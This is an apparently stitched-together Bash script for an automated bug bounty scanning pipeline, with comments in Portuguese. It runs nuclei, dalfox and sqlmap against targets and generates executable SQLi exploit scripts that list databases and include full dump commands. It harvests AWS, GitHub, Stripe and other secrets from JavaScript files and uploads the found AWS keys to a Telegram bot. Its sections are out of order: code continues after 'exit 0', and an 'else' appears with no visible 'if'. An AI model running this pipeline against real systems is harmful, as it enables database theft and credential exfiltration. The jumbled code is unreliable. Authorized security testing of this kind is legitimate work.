        elif [[ "$NUCLEI_FAST_TOTAL" -gt 0 ]] || [[ "$TOTAL_SECRETS" -gt 0 ]]; then
            ALERT="🟡 *MEDIUM RISK*"  
        else
            ALERT="🟢 *LOW RISK*"
        fi
        
        FINAL_SUMMARY="$ALERT  
🎯 *Enhanced Bug Bounty Scan COMPLETE* ✅
📂 \`$(pwd | sed 's/.*\///')\`  
⏱️ Finalizado: \`$(date '+%H:%M:%S')\`
🔧 Perfil: \`$PROFILE\` | Modo: \`$([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || echo "ATIVO")\`

*📊 Attack Surface:*  
- 🌐 Subdomains: $SUBS_FOUND  
- 🟢 Live hosts: $LIVE_HOSTS  
- 🔗 URLs: $TOTAL_URLS ($PARAM_URLS com parâmetros)  
- 🚪 Portas: $PORTS_FOUND abertas
- 🔌 APIs: $API_ENDPOINTS endpoints

*🔥 Critical Findings:*  
- ⚡ Nuclei crítico: $NUCLEI_FAST_TOTAL  
- 💉 SQLi confirmada: $SQLI_VALIDATED
- ❌ XSS confirmado: $DALFOX_RESULTS
- 🔑 Secrets expostos: $TOTAL_SECRETS

*⚡ Vulnerability Candidates:*  
- ❌ XSS candidatos: $XSS_CANDIDATES  
- 💉 SQLi candidatos: $SQLI_CANDIDATES
- 📁 LFI candidatos: $LFI_CANDIDATES
- 🌐 SSRF candidatos: $SSRF_CANDIDATES
- 🔍 Médio risco: $NUCLEI_EXT_TOTAL

*🎯 Next Steps:*
- Review critical Nuclei findings
- Validate XSS results from Dalfox  
- Check secrets/ directory for exposure
- Manual SQLi testing if authorized
$([ "$DRY_RUN" = "true" ] && echo "- Re-run with --confirm for active scanning" || echo "")
"
        
        send_telegram_message_enhanced "$FINAL_SUMMARY" "false"
        
        # Enviar arquivos importantes
        send_file_to_telegram "reports/report.md" "Relatório completo"
        send_file_to_telegram "html/dashboard.html" "Dashboard HTML"
        
        if [[ "$NUCLEI_FAST_TOTAL" -gt 0 ]]; then
            send_file_to_telegram "nuclei/nuclei_hosts_fast.txt" "Nuclei críticos"
        fi
        
        if [[ "$TOTAL_SECRETS" -gt 0 ]]; then
            send_file_to_telegram "secrets/aws_keys.txt" "AWS keys encontradas"
        fi
    else
        log_info "Telegram não configurado"
    fi
}

send_file_to_telegram() {
    local file="$1"
    local description="$2"
    
    if [[ -f "$file" ]] && [[ -s "$file" ]]; then
        log_info "Enviando $description para Telegram..."
        telegram_rate_limit
        curl -s -m 90 -F chat_id="${TELEGRAM_CHAT_ID}" -F document=@"$file" \
             "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" >/dev/null 2>&1 || true
    fi
}

final_telegram_report

# ============= SAÍDA FINAL COLORIDA =============
echo ""
echo "============================================================"
echo "🎯 ENHANCED BUG BOUNTY SCAN COMPLETE"
echo "============================================================"
echo "📁 Resultados salvos em: $(pwd)"
echo "🔧 Perfil usado: $PROFILE"
echo "⚙️  Modo: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN (apenas coleta)" || echo "ATIVO (scanning completo)")"
echo ""
echo "📊 RESUMO EXECUTIVO:"
echo "   🌐 Subdomínios: $SUBS_FOUND"
echo "   ✅ Hosts vivos: $LIVE_HOSTS"
echo "   🔗 URLs coletadas: $TOTAL_URLS ($PARAM_URLS com parâmetros)"
echo "   🔌 APIs encontradas: $API_ENDPOINTS"
echo ""
echo "🔥 VULNERABILIDADES:"
echo "   ⚡ Nuclei crítico: $NUCLEI_FAST_TOTAL"
echo "   💉 SQLi confirmada: $SQLI_VALIDATED"
echo "   ❌ XSS confirmado: $DALFOX_RESULTS"
echo "   🔑 Secrets expostos: $TOTAL_SECRETS"
echo ""
echo "📋 RELATÓRIOS:"
echo "   📄 Relatório completo: reports/report.md"  
echo "   🌐 Dashboard HTML: html/dashboard.html"
echo "   📊 Resumo rápido: reports/vuln_summary.txt"
if [[ "$EXPORT_JSON" = "true" ]]; then
echo "   📋 Export JSON: reports/results.json"
fi
echo ""
echo "🚀 PRÓXIMOS PASSOS:"
echo "   1. Revisar findings críticos do Nuclei"
if [[ "$DALFOX_RESULTS" -gt 0 ]]; then
echo "   2. ⚠️  VALIDAR XSS confirmados pelo Dalfox"
fi
if [[ "$TOTAL_SECRETS" -gt 0 ]]; then
echo "   3. 🔍 VERIFICAR secrets expostos em secrets/"
fi
if [[ "$DRY_RUN" = "true" ]]; then
echo "   4. Re-executar com --confirm para scanning ativo"
fi
echo "   5. Teste manual de candidatos SQLi/LFI/SSRF"
echo ""
echo "⚠️  LEMBRETE: Validação manual necessária antes de reportar"
echo "============================================================"

# Log final
log_info "Scan completo. Profile: $PROFILE, Mode: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || echo "ACTIVE")"
log_info "Total runtime: $(date -d@$(($(date +%s) - $(stat -c %Y logs/scanner.log 2>/dev/null || date +%s))) -u +%H:%M:%S 2>/dev/null || echo "N/A")"

# Salvar configuração usada para referência futura
cat > logs/scan_config.txt <<-CONFIGEOF
SCAN CONFIGURATION - $(date -u)
==============================
Profile: $PROFILE
Mode: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || echo "ACTIVE")
Concurrency: $CONCURRENCY
Rate Limit: $RATE_LIMIT/s
Parallel Hosts: $PARALLEL_HOSTS
Timeout per Host: $TIMEOUT_PER_HOST
CPUs Used: $NCPU
Max Crawl Depth: $MAX_CRAWL_DEPTH

Command: $0 $*

Results Directory: $(pwd)
CONFIGEOF

exit 0
    echo "========== FASE 5: VULNERABILITY SCANNING =========="
    send_telegram_status "🎯 *NUCLEI VULNERABILITY SCAN*
Iniciando varredura de vulnerabilidades..."
    
    # Nuclei scanning com controles apropriados
    nuclei_scanning() {
        if command -v nuclei >/dev/null 2>&1; then
            log_info "Executando nuclei FAST mode (vulnerabilidades críticas)..."
            
            if [[ -s alive/hosts.txt ]]; then
                timeout 1h cat alive/hosts.txt | head -50 | nuclei -silent \
                  -tags cves,exposures,tokens,takeovers,default-logins \
                  -severity critical,high \
                  $NUCLEI_FLAGS \
                  -o nuclei/nuclei_hosts_fast.txt 2>/dev/null || true
            fi
            
            if [[ -s urls/all_urls_raw.txt ]]; then
                timeout 1h cat urls/all_urls_raw.txt | head -100 | nuclei -silent \
                  -tags cves,exposures,tokens,takeovers,default-logins \
                  -severity critical,high \
                  $NUCLEI_FLAGS \
                  -o nuclei/nuclei_urls_fast.txt 2>/dev/null || true
            fi
            
            # Extended mode - riscos médios
            log_info "Executando nuclei EXTENDED mode (riscos médios)..."
            
            if [[ -s alive/hosts.txt ]]; then
                timeout 2h cat alive/hosts.txt | head -30 | nuclei -silent \
                  -tags misconfig,panels,default-logins,exposures \
                  -severity high,critical,medium \
                  $NUCLEI_FLAGS_EXT \
                  -o nuclei/nuclei_hosts_ext.txt 2>/dev/null || true
            fi
        fi
    }
    
    nuclei_scanning
    
    # XSS Testing com Dalfox (se disponível)
    xss_testing() {
        if command -v dalfox >/dev/null 2>&1 && [[ -s urls/with_params.txt ]]; then
            log_info "Executando dalfox XSS testing..."
            
            timeout 30m cat urls/with_params.txt | head -50 | dalfox pipe \
              -w $((CONCURRENCY / 2)) \
              --timeout 10 \
              --skip-bav \
              --silence \
              -o nuclei/dalfox_results.txt 2>/dev/null || true
        fi
    }
    
    xss_testing
    
    # ============= SQLMAP TESTING HABILITADO COM CONTROLES DE SEGURANÇA =============
    sqlmap_testing() {
        if command -v sqlmap >/dev/null 2>&1 && [[ -s urls/with_params.txt ]]; then
            log_info "Iniciando SQLMap testing com controles de segurança..."
            send_telegram_status "💉 *SQL INJECTION TESTING*
Testando $PARAM_URLS URLs para SQLi..."
            
            mkdir -p poc/sqli logs/sqlmap
            
            # Preparar candidatos SQLi
            if command -v gf >/dev/null 2>&1; then
                cat urls/with_params.txt | gf sqli 2>/dev/null > urls/sqli_candidates.txt || true
            else
                # Fallback: regex patterns para parâmetros suspeitos
                grep -Ei "(\?|&)(id|user|search|category|page|item|product)=" urls/with_params.txt > urls/sqli_candidates.txt 2>/dev/null || true
            fi
            
            # Se não encontrou candidatos, usar algumas URLs com parâmetros
            if [[ ! -s urls/sqli_candidates.txt ]]; then
                head -10 urls/with_params.txt > urls/sqli_candidates.txt
            fi
            
            local candidates=$(safe_count urls/sqli_candidates.txt)
            log_info "Testando $candidates candidatos SQLi com sqlmap..."
            
            # Limite seguro de URLs para testar
            local max_urls=10
            [[ "$PROFILE" = "light" ]] && max_urls=5
            [[ "$PROFILE" = "aggressive" ]] && max_urls=20
            
            local current=0
            > urls/sqli_validated.txt
            
            head -n "$max_urls" urls/sqli_candidates.txt | while read -r url && [[ $current -lt $max_urls ]]; do
                current=$((current + 1))
                log_info "[SQLMap $current/$max_urls] Testando: $url"
                
                # Hash para nome de arquivo único
                local url_hash=$(echo "$url" | md5sum | cut -c1-8)
                local log_file="logs/sqlmap/sqlmap_${url_hash}.txt"
                
                # SQLMap com parâmetros seguros
                timeout 120s sqlmap \
                    -u "$url" \
                    --batch --level=1 --risk=1 \
                    --random-agent --threads=1 \
                    --technique=BEUST \
                    --no-cast --disable-coloring \
                    --answers="follow=N,other=N,crack=N,dict=N,keep=Y" \
                    --timeout=30 --retries=1 \
                    --output-dir="poc/sqli" \
                    > "$log_file" 2>&1 || {
                        echo "[TIMEOUT/ERROR] $url" >> logs/sqlmap/errors.log
                        continue
                    }
                
                # Verificar se encontrou vulnerabilidade
                if grep -qi "parameter.*is vulnerable\|sqlmap identified the following injection point\|payload.*worked" "$log_file"; then
                    echo "$url" >> urls/sqli_validated.txt
                    log_info "⚠️  VULNERABILIDADE SQLi ENCONTRADA: $url"
                    
                    # Alertar no Telegram se configurado
                    if [[ -n "$TELEGRAM_BOT_TOKEN" ]] && [[ -n "$TELEGRAM_CHAT_ID" ]]; then
                        send_telegram_message_enhanced "🚨 *SQL INJECTION FOUND!*
💉 URL: \`$url\`
🔍 Verificar: poc/sqli/ e logs/sqlmap/" "true"
                    fi
                    
                    # Criar PoC de exploit
                    cat > "poc/sqli/exploit_${url_hash}.sh" <<-SQLPOC
#!/bin/bash
# SQLi exploit para: $url
# Encontrada em: $(date)

echo "=== SQLi Exploitation PoC ==="
echo "Target: $url"
echo ""

echo "1. Listando databases:"
sqlmap -u "$url" --batch --dbs --threads=2

echo ""
echo "2. Para dump de tabelas específicas:"
echo "sqlmap -u '$url' --batch -D DATABASE_NAME --tables"

echo ""
echo "3. CUIDADO: Dump completo (apenas com autorização):"
echo "sqlmap -u '$url' --batch --dump --threads=2"
SQLPOC
                    chmod +x "poc/sqli/exploit_${url_hash}.sh"
                fi
            done
            
            local sqli_found=$(safe_count urls/sqli_validated.txt)
            log_info "SQLMap testing completo. Vulnerabilidades encontradas: $sqli_found"
            
            if [[ "$sqli_found" -gt 0 ]]; then
                send_telegram_status "🚨 *SQLi VULNERABILITIES CONFIRMED*
💥 $sqli_found SQL injections encontradas!
📁 PoCs gerados em poc/sqli/
⚠️ REVISÃO MANUAL URGENTE!" true
            else
                send_telegram_status "✅ *SQLi TESTING COMPLETE*
🛡️ Nenhuma vulnerabilidade SQLi confirmada nos candidatos testados"
            fi
        else
            log_info "SQLMap não disponível ou nenhuma URL com parâmetros encontrada"
            touch urls/sqli_candidates.txt urls/sqli_validated.txt
        fi
    }
    
    sqlmap_testing
    
else
    log_info "DRY-RUN: Pulando vulnerability scanning"
    touch nuclei/nuclei_hosts_fast.txt nuclei/nuclei_urls_fast.txt
    touch nuclei/nuclei_hosts_ext.txt nuclei/dalfox_results.txt
fi

# ============= SECRETS HUNTING APRIMORADO =============
echo ""
echo "========== SECRETS HUNTING =========="
send_telegram_status "🔑 *SECRETS HUNTING*
Analisando arquivos JS para secrets..."

secrets_hunting() {
    mkdir -p secrets
    
    if [[ -d js/downloads ]] && [[ "$(ls -A js/downloads 2>/dev/null)" ]]; then
        log_info "Escaneando arquivos JavaScript para secrets..."
        
        # AWS Keys
        grep -IrohE "AKIA[0-9A-Z]{16}" js/downloads/* 2>/dev/null | sort -u > secrets/aws_keys.txt || true
        
        # Google API Keys
        grep -IrohE "AIza[0-9A-Za-z\\-_]{35}" js/downloads/* 2>/dev/null | sort -u > secrets/google_api_keys.txt || true
        
        # Firebase Keys
        grep -IrohE "firebase[_-]?api[_-]?key[\"']?\s*[:=]\s*[\"'][A-Za-z0-9\-_.]{20,}[\"']" js/downloads/* 2>/dev/null | sort -u > secrets/firebase_keys.txt || true
        
        # JWT Tokens
        grep -IrohE "eyJ[0-9A-Za-z\-_]{30,}\.[0-9A-Za-z\-_]{30,}\.[0-9A-Za-z\-_]{20,}" js/downloads/* 2>/dev/null | sort -u > secrets/jwt_tokens.txt || true
        
        # GitHub Tokens
        grep -IrohE "ghp_[0-9A-Za-z]{36}" js/downloads/* 2>/dev/null | sort -u > secrets/github_tokens.txt || true
        
        # Stripe Keys
        grep -IrohE "sk_live_[0-9a-zA-Z]{24}" js/downloads/* 2>/dev/null | sort -u > secrets/stripe_keys.txt || true
        
        # Generic API Keys
        grep -IrohE "(api[_-]?key|apikey|access[_-]?token)[\"']?\s*[:=]\s*[\"'][A-Za-z0-9\-_.]{16,}[\"']" js/downloads/* 2>/dev/null | sort -u > secrets/generic_api_keys.txt || true
        
        # Contar secrets encontrados
        AWS_SECRETS=$(safe_count secrets/aws_keys.txt)
        GOOGLE_SECRETS=$(safe_count secrets/google_api_keys.txt)
        JWT_SECRETS=$(safe_count secrets/jwt_tokens.txt)
        GITHUB_SECRETS=$(safe_count secrets/github_tokens.txt)
        STRIPE_SECRETS=$(safe_count secrets/stripe_keys.txt)
        
        TOTAL_SECRETS=$((AWS_SECRETS + GOOGLE_SECRETS + JWT_SECRETS + GITHUB_SECRETS + STRIPE_SECRETS))
        
        if [[ "$TOTAL_SECRETS" -gt 0 ]]; then
            log_info "⚠️  SECRETS ENCONTRADOS: $TOTAL_SECRETS"
        fi
    else
        log_info "Nenhum arquivo JS encontrado para análise de secrets"
        touch secrets/aws_keys.txt secrets/google_api_keys.txt secrets/jwt_tokens.txt
        TOTAL_SECRETS=0
    fi
}

secrets_hunting

# ============= CLASSIFICAÇÃO GF MELHORADA =============
echo ""
echo "========== GF CLASSIFICATION =========="
send_telegram_status "🔍 *GF CLASSIFICATION*
Classificando URLs por tipo de vulnerabilidade..."

gf_classification() {
    if command -v gf >/dev/null 2>&1 && [[ -s urls/all_urls_raw.txt ]]; then
        log_info "Executando classificação gf contra todas as URLs..."
        
        cat urls/all_urls_raw.txt | gf xss 2>/dev/null | sort -u > urls/gf_xss.txt || true
        cat urls/all_urls_raw.txt | gf sqli 2>/dev/null | sort -u > urls/gf_sqli.txt || true
        cat urls/all_urls_raw.txt | gf lfi 2>/dev/null | sort -u > urls/gf_lfi.txt || true
        cat urls/all_urls_raw.txt | gf ssrf 2>/dev/null | sort -u > urls/gf_ssrf.txt || true
        cat urls/all_urls_raw.txt | gf redirect 2>/dev/null | sort -u > urls/gf_redirect.txt || true
        cat urls/all_urls_raw.txt | gf rce 2>/dev/null | sort -u > urls/gf_rce.txt || true
        
    else
        log_info "gf não disponível ou nenhuma URL para classificar"
        touch urls/gf_xss.txt urls/gf_sqli.txt urls/gf_lfi.txt urls/gf_ssrf.txt urls/gf_redirect.txt urls/gf_rce.txt
    fi
}

gf_classification

XSS_CANDIDATES=$(safe_count urls/gf_xss.txt)
SQLI_CANDIDATES=$(safe_count urls/gf_sqli.txt)
LFI_CANDIDATES=$(safe_count urls/gf_lfi.txt)
SSRF_CANDIDATES=$(safe_count urls/gf_ssrf.txt)

# ============= RELATÓRIOS APRIMORADOS =============
echo ""
echo "========== GENERATING ENHANCED REPORTS =========="
send_telegram_status "📊 *GENERATING REPORTS*
Compilando relatórios finais..."

# Contar vulnerabilidades para resumo
NUCLEI_FAST_COUNT=$(safe_count nuclei/nuclei_hosts_fast.txt)
NUCLEI_FAST_URLS=$(safe_count nuclei/nuclei_urls_fast.txt)
NUCLEI_EXT_COUNT=$(safe_count nuclei/nuclei_hosts_ext.txt)
NUCLEI_FAST_TOTAL=$((NUCLEI_FAST_COUNT + NUCLEI_FAST_URLS))
NUCLEI_EXT_TOTAL=$((NUCLEI_EXT_COUNT))
DALFOX_RESULTS=$(safe_count nuclei/dalfox_results.txt)
SQLI_VALIDATED=$(safe_count urls/sqli_validated.txt)

# Criar resumo de vulnerabilidades
cat > reports/vuln_summary.txt <<-VSUMMARY
VULNERABILITY SUMMARY - $(date -u)
=====================================

🔥 CRITICAL FINDINGS:
- Nuclei Critical: $NUCLEI_FAST_TOTAL  
- SQLi Confirmed: $SQLI_VALIDATED
- Exposed Secrets: $TOTAL_SECRETS
- XSS Findings: $DALFOX_RESULTS

⚡ POTENTIAL ISSUES:
- XSS Candidates: $XSS_CANDIDATES
- SQLi Candidates: $SQLI_CANDIDATES
- LFI Candidates: $LFI_CANDIDATES
- SSRF Candidates: $SSRF_CANDIDATES
- Nuclei Medium: $NUCLEI_EXT_TOTAL

📊 ATTACK SURFACE:
- Live Hosts: $LIVE_HOSTS
- URLs with Params: $PARAM_URLS
- API Endpoints: $API_ENDPOINTS
- JS Files Downloaded: $JS_DOWNLOADED

PROFILE: $PROFILE
MODE: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN (collection only)" || echo "ACTIVE (full scanning)")
PRIORITY: $([ "$NUCLEI_FAST_TOTAL" -gt 5 ] && echo "🔴 HIGH" || [ "$NUCLEI_FAST_TOTAL" -gt 0 ] && echo "🟡 MEDIUM" || echo "🟢 LOW")
VSUMMARY

# Relatório markdown completo
REPORT=reports/report.md

cat > "$REPORT" <<-EOT
# Bug Bounty Reconnaissance Report
Generated: $(date -u)  
Target Scope: $(basename "$SCOPE_FILE")
Profile: **$PROFILE** | Mode: **$([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || echo "ACTIVE")**

## 🎯 Executive Summary
- **Attack Surface**: $LIVE_HOSTS live hosts, $PARAM_URLS parameterized URLs
- **Risk Level**: $([ "$NUCLEI_FAST_TOTAL" -gt 5 ] && echo "🔴 **HIGH**" || [ "$NUCLEI_FAST_TOTAL" -gt 0 ] && echo "🟡 **MEDIUM**" || echo "🟢 **LOW**")
- **Scan Profile**: $PROFILE (Concurrency: $CONCURRENCY, Rate: $RATE_LIMIT/s)

## 🔥 Critical Vulnerabilities Confirmed

### High-Risk Nuclei Findings
- **Fast Scan**: $NUCLEI_FAST_TOTAL critical findings
- **Details**: See \`nuclei/nuclei_hosts_fast.txt\` and \`nuclei/nuclei_urls_fast.txt\`

### Cross-Site Scripting (XSS)
- **Dalfox Results**: $DALFOX_RESULTS confirmed findings
- **Candidates**: $XSS_CANDIDATES endpoints
- **Details**: See \`nuclei/dalfox_results.txt\` and \`urls/gf_xss.txt\`

### Information Disclosure  
- **Secrets Found**: $TOTAL_SECRETS items
- **AWS Keys**: $(safe_count secrets/aws_keys.txt)
- **Google API**: $(safe_count secrets/google_api_keys.txt)
- **JWT Tokens**: $(safe_count secrets/jwt_tokens.txt)
- **GitHub Tokens**: $(safe_count secrets/github_tokens.txt)
- **Stripe Keys**: $(safe_count secrets/stripe_keys.txt)
- **Location**: \`secrets/\` directory

## ⚡ Potential Vulnerabilities

### SQL Injection
- **Candidates**: $SQLI_CANDIDATES endpoints  
- **Confirmed**: $(safe_count urls/sqli_validated.txt) vulnerabilities
- **Details**: See \`urls/gf_sqli.txt\` and \`poc/sqli/\`
- **Note**: SQLMap testing enabled with safety controls

### Other Vulnerabilities
- **LFI Candidates**: $LFI_CANDIDATES
- **SSRF Candidates**: $SSRF_CANDIDATES
- **RCE Candidates**: $(safe_count urls/gf_rce.txt)

### Misconfigurations
- **Nuclei Extended**: $NUCLEI_EXT_TOTAL findings  
- **Details**: See \`nuclei/nuclei_hosts_ext.txt\`

## 📊 Attack Surface Analysis

### Reconnaissance Results
- **Subdomains Discovered**: $SUBS_FOUND
- **Live Hosts**: $LIVE_HOSTS  
- **Total URLs**: $TOTAL_URLS
- **Parameterized URLs**: $PARAM_URLS
- **JavaScript Files**: $JS_FILES ($JS_DOWNLOADED downloaded)

### API Surface  
- **API Endpoints**: $API_ENDPOINTS
- **Details**: See \`apis/api_endpoints.txt\`

### Port Scanning
- **Open Ports**: $PORTS_FOUND
- **Hosts with Ports**: $HOSTS_WITH_PORTS

### Technology Stack
- **Details**: See \`alive/httpx_parsed.txt\` for full tech stack information

## 📁 Important Files
- **Live Hosts**: \`alive/httpx_results.txt\`
- **Parameterized URLs**: \`urls/with_params.txt\` 
- **Nuclei Results**: \`nuclei/nuclei_*_fast.txt\` (critical), \`nuclei/nuclei_*_ext.txt\` (extended)
- **XSS Results**: \`nuclei/dalfox_results.txt\`
- **Secrets**: \`secrets/\` directory
- **API Endpoints**: \`apis/api_endpoints.txt\`
- **GF Classification**: \`urls/gf_*.txt\`

## 🚀 Next Steps
1. **Immediate**: Review critical Nuclei findings in \`nuclei/nuclei_*_fast.txt\`
2. **High Priority**: Validate XSS findings from Dalfox
3. **Medium Priority**: Review secrets in \`secrets/\` for sensitive exposure
4. **Validated SQLi**: Check confirmed SQLi in \`urls/sqli_validated.txt\` and \`poc/sqli/\`
5. **Manual Testing**: Additional SQLi candidates in \`urls/gf_sqli.txt\`
6. **Ongoing**: Monitor misconfigurations from extended Nuclei scan

## ⚙️ Configuration Used
- **Profile**: $PROFILE
- **Concurrency**: $CONCURRENCY threads
- **Rate Limit**: $RATE_LIMIT/s
- **Parallel Hosts**: $PARALLEL_HOSTS
- **Timeout**: $TIMEOUT_PER_HOST per host
- **Mode**: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN (safe collection only)" || echo "ACTIVE (full vulnerability scanning)")

## ⚠️ Methodology Notes
- Profile-based resource management for safe operation
- DRY-RUN mode enabled by default for safety
- Active scanning requires explicit --confirm flag
- SQLMap testing enabled with level=1, risk=1 safety controls
- All timeouts and rate limits configured per profile
- Scope validation and wildcard handling implemented
- Manual verification required before reporting findings

## 🔧 Tool Coverage
**Subdomain Enumeration**: subfinder, amass, findomain, chaos, crt.sh
**Live Detection**: httpx with tech detection
**Port Scanning**: naabu$([ "$DRY_RUN" = "true" ] && echo " (skipped in dry-run)" || echo "")
**URL Collection**: gau, waybackurls, hakrawler, katana, gospider
**Vulnerability Scanning**: nuclei, dalfox$([ "$DRY_RUN" = "true" ] && echo " (skipped in dry-run)" || echo "")
**Classification**: gf patterns
**Secrets**: regex-based JS analysis

---
**Report generated by enhanced reconnaissance pipeline with profile-based controls**
**Command used**: $0 $([ "$DRY_RUN" = "true" ] && echo "--dry-run" || echo "--confirm") --profile=$PROFILE $SCOPE_FILE
EOT

# Criar dashboard HTML melhorado
HTML=html/dashboard.html
cat > "$HTML" <<-HTMLDOC
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Enhanced Recon Dashboard</title>
  <style>
    body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;padding:20px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);margin:0}
    .container{max-width:1400px;margin:0 auto;background:white;padding:30px;border-radius:15px;box-shadow:0 8px 32px rgba(0,0,0,0.1)}
    .header{text-align:center;margin-bottom:30px;padding:20px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);border-radius:10px;color:white}
    .metric{display:inline-block;margin:10px;padding:20px;background:#f8f9fa;border-radius:12px;min-width:140px;text-align:center;border:2px solid transparent;transition:all 0.3s ease}
    .metric:hover{transform:translateY(-5px);box-shadow:0 5px 15px rgba(0,0,0,0.1)}
    .metric-value{font-size:28px;font-weight:bold;color:#2563eb}
    .metric-label{font-size:12px;color:#6b7280;margin-top:8px;font-weight:500}
    .critical{background:linear-gradient(135deg,#fef2f2,#fee2e2);border-color:#ef4444;color:#dc2626}
    .critical .metric-value{color:#dc2626}
    .warning{background:linear-gradient(135deg,#fefce8,#fef3c7);border-color:#f59e0b;color:#d97706}
    .warning .metric-value{color:#d97706}
    .success{background:linear-gradient(135deg,#f0fdf4,#dcfce7);border-color:#10b981;color:#059669}
    .success .metric-value{color:#059669}
    .profile-badge{display:inline-block;padding:8px 16px;background:#6366f1;color:white;border-radius:20px;font-size:14px;font-weight:bold;margin:10px}
    pre{background:#f4f4f4;padding:15px;border-radius:8px;overflow-x:auto;border-left:4px solid #6366f1}
    h1{color:#1f2937;margin-bottom:10px;font-size:2.5rem}
    h2{color:#374151;margin-top:40px;margin-bottom:20px;font-size:1.5rem;border-bottom:2px solid #e5e7eb;padding-bottom:10px}
    .status{text-align:center;padding:15px;border-radius:10px;margin:20px 0;font-weight:bold}
    .dry-run{background:#fef3c7;color:#92400e;border:2px solid #f59e0b}
    .active{background:#dcfce7;color:#166534;border:2px solid #10b981}
    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;margin:20px 0}
    .card{background:white;padding:20px;border-radius:10px;box-shadow:0 2px 8px rgba(0,0,0,0.1);border-left:4px solid #6366f1}
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>🎯 Enhanced Bug Bounty Dashboard</h1>
      <p><strong>Generated:</strong> $(date -u) | <strong>Target:</strong> $(basename "$SCOPE_FILE")</p>
      <span class="profile-badge">Profile: $PROFILE</span>
    </div>
    
    <div class="status $([ "$DRY_RUN" = "true" ] && echo "dry-run" || echo "active")">
      Mode: $([ "$DRY_RUN" = "true" ] && echo "🔍 DRY-RUN (Collection Only)" || echo "⚡ ACTIVE SCANNING")
    </div>
    
    <h2>📊 Attack Surface Overview</h2>
    <div class="metric">
      <div class="metric-value">$SUBS_FOUND</div>
      <div class="metric-label">Subdomains</div>
    </div>
    <div class="metric success">
      <div class="metric-value">$LIVE_HOSTS</div>
      <div class="metric-label">Live Hosts</div>
    </div>
    <div class="metric">
      <div class="metric-value">$TOTAL_URLS</div>
      <div class="metric-label">URLs Found</div>
    </div>
    <div class="metric warning">
      <div class="metric-value">$PARAM_URLS</div>
      <div class="metric-label">With Parameters</div>
    </div>
    <div class="metric">
      <div class="metric-value">$API_ENDPOINTS</div>
      <div class="metric-label">API Endpoints</div>
    </div>
    
    <h2>🔥 Critical Security Findings</h2>
    <div class="metric critical">
      <div class="metric-value">$NUCLEI_FAST_TOTAL</div>
      <div class="metric-label">Nuclei Critical</div>
    </div>
    <div class="metric critical">
      <div class="metric-value">$SQLI_VALIDATED</div>
      <div class="metric-label">SQLi Confirmed</div>
    </div>
    <div class="metric critical">
      <div class="metric-value">$DALFOX_RESULTS</div>
      <div class="metric-label">XSS Confirmed</div>
    </div>
    <div class="metric warning">
      <div class="metric-value">$TOTAL_SECRETS</div>
      <div class="metric-label">Secrets Exposed</div>
    </div>
    
    <h2>⚡ Vulnerability Candidates</h2>
    <div class="metric warning">
      <div class="metric-value">$XSS_CANDIDATES</div>
      <div class="metric-label">XSS Candidates</div>
    </div>
    <div class="metric warning">
      <div class="metric-value">$SQLI_CANDIDATES</div>
      <div class="metric-label">SQLi Candidates</div>
    </div>
    <div class="metric">
      <div class="metric-value">$LFI_CANDIDATES</div>
      <div class="metric-label">LFI Candidates</div>
    </div>
    <div class="metric">
      <div class="metric-value">$SSRF_CANDIDATES</div>
      <div class="metric-label">SSRF Candidates</div>
    </div>
    
    <h2>🔧 EXTRA TOOLS Results</h2>
    <div class="metric">
      <div class="metric-value">$KXSS_RESULTS</div>
      <div class="metric-label">kxss Results</div>
    </div>
    <div class="metric">
      <div class="metric-value">$LINKFINDER_ENDPOINTS</div>
      <div class="metric-label">Linkfinder Endpoints</div>
    </div>
    <div class="metric">
      <div class="metric-value">$PARAMSPIDER_PARAMS</div>
      <div class="metric-label">Paramspider Params</div>
    </div>
    <div class="metric success">
      <div class="metric-value">$((GOWITNESS_SCREENSHOTS + AQUATONE_SCREENSHOTS))</div>
      <div class="metric-label">Screenshots</div>
    </div>
    <div class="metric">
      <div class="metric-value">$SECRETFINDER_SECRETS</div>
      <div class="metric-label">Secretfinder</div>
    </div>
    <div class="metric warning">
      <div class="metric-value">$S3_BUCKETS</div>
      <div class="metric-label">S3 Buckets</div>
    </div>
    
    <div class="grid">
      <div class="card">
        <h3>🔧 Profile Configuration</h3>
        <ul>
          <li>Concurrency: $CONCURRENCY threads</li>
          <li>Rate Limit: $RATE_LIMIT/s</li>
          <li>Parallel Hosts: $PARALLEL_HOSTS</li>
          <li>Timeout: $TIMEOUT_PER_HOST</li>
          <li>CPUs: $NCPU</li>
        </ul>
      </div>
      
      <div class="card">
        <h3>📈 Success Rates</h3>
        <ul>
          <li>Subdomain Expansion: $(echo "scale=1; $SUBS_FOUND / $TOTAL_DOMAINS" | bc 2>/dev/null || echo "N/A")x</li>
          <li>Live Host Rate: $(echo "scale=1; $LIVE_HOSTS * 100 / $SUBS_FOUND" | bc 2>/dev/null || echo "N/A")%</li>
          <li>Parameterized URLs: $(echo "scale=1; $PARAM_URLS * 100 / $TOTAL_URLS" | bc 2>/dev/null || echo "N/A")%</li>
        </ul>
      </div>
    </div>
    
    <h2>🔍 Latest Critical Findings</h2>
    <pre>$(head -n 20 nuclei/nuclei_*_fast.txt nuclei/dalfox_results.txt 2>/dev/null || echo "No critical findings in this scan")</pre>
    
    <h2>🔗 Quick Navigation</h2>
    <div class="grid">
      <div class="card">
        <h3>📋 Reports</h3>
        <ul>
          <li><a href="../reports/report.md">📋 Full Report</a></li>
          <li><a href="../reports/vuln_summary.txt">⚡ Quick Summary</a></li>
        </ul>
      </div>
      
      <div class="card">
        <h3>🔥 Vulnerabilities</h3>
        <ul>
          <li><a href="../nuclei/">🎯 Nuclei Results</a></li>
          <li><a href="../secrets/">🔑 Secrets Directory</a></li>
          <li><a href="../urls/sqli_validated.txt">💉 SQLi Confirmed</a></li>
          <li><a href="../urls/gf_xss.txt">❌ XSS Candidates</a></li>
